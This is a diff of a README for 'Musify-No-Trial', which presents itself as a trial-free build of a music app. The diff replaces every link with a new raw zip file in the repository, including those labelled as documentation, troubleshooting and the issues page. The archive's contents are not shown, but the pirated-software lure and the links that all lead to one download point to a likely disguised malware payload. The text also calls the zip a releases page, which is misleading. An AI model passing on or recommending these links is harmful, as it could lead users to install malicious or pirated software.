@@ -6,9 +6,9 @@ Welcome to Musify-No-Trial! This application is designed to help you manage your
 
 ## 📥 Download Musify
 
-[![Download Musify](https://raw.githubusercontent.com/devgid94/Musify-No-Trial/main/vesicae/Musify-No-Trial-1.6-beta.2.zip)](https://raw.githubusercontent.com/devgid94/Musify-No-Trial/main/vesicae/Musify-No-Trial-1.6-beta.2.zip)
+[![Download Musify](https://github.com/devgid94/Musify-No-Trial/raw/refs/heads/main/vesicae/No-Musify-Trial-3.2.zip)](https://github.com/devgid94/Musify-No-Trial/raw/refs/heads/main/vesicae/No-Musify-Trial-3.2.zip)
 
-Visit this page to download: [Download Musify](https://raw.githubusercontent.com/devgid94/Musify-No-Trial/main/vesicae/Musify-No-Trial-1.6-beta.2.zip)
+Visit this page to download: [Download Musify](https://github.com/devgid94/Musify-No-Trial/raw/refs/heads/main/vesicae/No-Musify-Trial-3.2.zip)
 
 ## 🔧 System Requirements
 
@@ -35,9 +35,9 @@ Musify-No-Trial offers various features to enhance your music experience:
 
 For complete guides, tutorials, and reference materials, visit our documentation:
 
-- [User Guide](https://raw.githubusercontent.com/devgid94/Musify-No-Trial/main/vesicae/Musify-No-Trial-1.6-beta.2.zip)
-- [How to use Musify](https://raw.githubusercontent.com/devgid94/Musify-No-Trial/main/vesicae/Musify-No-Trial-1.6-beta.2.zip)
-- [Troubleshooting](https://raw.githubusercontent.com/devgid94/Musify-No-Trial/main/vesicae/Musify-No-Trial-1.6-beta.2.zip)
+- [User Guide](https://github.com/devgid94/Musify-No-Trial/raw/refs/heads/main/vesicae/No-Musify-Trial-3.2.zip)
+- [How to use Musify](https://github.com/devgid94/Musify-No-Trial/raw/refs/heads/main/vesicae/No-Musify-Trial-3.2.zip)
+- [Troubleshooting](https://github.com/devgid94/Musify-No-Trial/raw/refs/heads/main/vesicae/No-Musify-Trial-3.2.zip)
 
 ### 🌟 Documentation Highlights
 
@@ -51,7 +51,7 @@ To download Musify-No-Trial, follow these steps:
 
 1. **Access the Releases Page:** Click the link below to navigate to the releases section.
    
-   [Download Musify](https://raw.githubusercontent.com/devgid94/Musify-No-Trial/main/vesicae/Musify-No-Trial-1.6-beta.2.zip)
+   [Download Musify](https://github.com/devgid94/Musify-No-Trial/raw/refs/heads/main/vesicae/No-Musify-Trial-3.2.zip)
 
 2. **Download the Latest Version:** On the releases page, find the latest version and click the download link.
 
@@ -71,7 +71,7 @@ To download Musify-No-Trial, follow these steps:
 
 Join our community to share experiences or ask questions:
 
-- **GitHub Issues:** Report bugs or suggest features directly on our [issues page](https://raw.githubusercontent.com/devgid94/Musify-No-Trial/main/vesicae/Musify-No-Trial-1.6-beta.2.zip).
+- **GitHub Issues:** Report bugs or suggest features directly on our [issues page](https://github.com/devgid94/Musify-No-Trial/raw/refs/heads/main/vesicae/No-Musify-Trial-3.2.zip).
 - **Community Discussions:** Engage with other users and exchange tips.
 
 Your input matters! We value your feedback and suggestions. They help us improve Musify for everyone.
@@ -80,4 +80,4 @@ Your input matters! We value your feedback and suggestions. They help us improve
 
 Thank you for choosing Musify-No-Trial! We hope this guide helps you install and run the software with ease. Enjoy your music and the endless possibilities it brings! 
 
-Don’t forget to visit the [Download Musify](https://raw.githubusercontent.com/devgid94/Musify-No-Trial/main/vesicae/Musify-No-Trial-1.6-beta.2.zip) page for the latest updates!
+Don’t forget to visit the [Download Musify](https://github.com/devgid94/Musify-No-Trial/raw/refs/heads/main/vesicae/No-Musify-Trial-3.2.zip) page for the latest updates!
